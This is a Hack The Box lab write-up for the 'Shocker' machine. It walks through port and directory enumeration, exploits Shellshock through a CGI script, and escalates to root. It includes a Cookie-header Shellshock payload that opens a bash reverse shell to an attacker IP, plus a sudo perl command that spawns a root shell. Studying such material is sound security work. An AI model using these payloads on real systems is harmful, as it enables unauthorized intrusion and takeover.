Title: HTB Shocker box writeup
Tags: oscp, htb, shellshock, sudo
Summary: Rooting the box using notorious vulnerability in bash
Date: 2020-09-11 15:00
Status: published

# Enumeration
nmap sS all range as always:
```text
    Nmap 7.80 scan initiated Fri Sep 11 11:25:24 2020 as: nmap -sS -p- -oA enum/nmap-ss-all shocker.htb
    Nmap scan report for shocker.htb (10.10.10.56)
    Host is up (0.051s latency).
    Not shown: 65533 closed ports
    PORT     STATE SERVICE
    80/tcp   open  http
    2222/tcp open  EtherNetIP-1
    Nmap done at Fri Sep 11 11:31:30 2020 -- 1 IP address (1 host up) scanned in 366.24 seconds
```
Tried to navigate in browser while nmap was scanning, turned out that there's a 
web server that responds with the same page at IP and at vhost `shocker.htb`.
OpenSSH listening on usual port TCP 2222:

![ssh 22222](/cstatic/htb-shocker/ssh-unusual.png)

No robots.txt or something like this is available, time to spin up the gobuster:
```text
    /.htpasswd (Status: 403)
    /.htaccess (Status: 403)
    /cgi-bin/ (Status: 403)
    /server-status (Status: 403)
```
CGI-BIN looks promising, unfortunately it's not possible to list the content of
this directory, but it's still worth trying to enumerate it further. Just add some common
extensions to the wordlist, something like sh, py, pl, php:
```text
    /.htpasswd (Status: 403)
    /.htpasswd.php (Status: 403)
    /.htaccess (Status: 403)
    /.htpasswd.sh (Status: 403)
    /.htpasswd.pl (Status: 403)
    /.htpasswd.py (Status: 403)
    /.htaccess.sh (Status: 403)
    /.htaccess.pl (Status: 403)
    /.htaccess.py (Status: 403)
    /.htaccess.php (Status: 403)
    /user.sh (Status: 200)
```
Got it! Something interesting in there. Popped out nearly at the end of the run,
I was almost thinking that nothing could be found in there. This script reporting
an uptime, at least it's being said so:

![uptime script](/cstatic/htb-shocker/get-user.sh.png)

Take a mental note about hostname (Shocker) and shell script in CGI-BIN.

# Exploitation
Couple of years ago [Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) or
as it's also called, Bashdoor, was discovered. Briefly, that's a code execution vulnerability
in the Bash, one of the attack vectors are CGI shell scripts - looks like our case. It was
a bit of struggling exploiting this one, since many attempts resulted in HTTP 500, but
I might be lucky since I've got a shell despite of having HTTP 500 response, such a 
cookie header was used: `Cookie: () { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.2/53 0>&1 &'`:

![unpriv shell](/cstatic/htb-shocker/unpriv-shell.png)

# Privilege escalation
`sudo -l` reported that it's possible to run perl w/o password:

![sudo -l](/cstatic/htb-shocker/sudo.png)

This is an instant root shell with `sudo perl -e 'exec("/bin/bash -i")'`:

![root shell](/cstatic/htb-shocker/root-shell.png)

Honestly it was the first thing I did having the unprivileged access, so PE was as simple as running `sudo -l`.
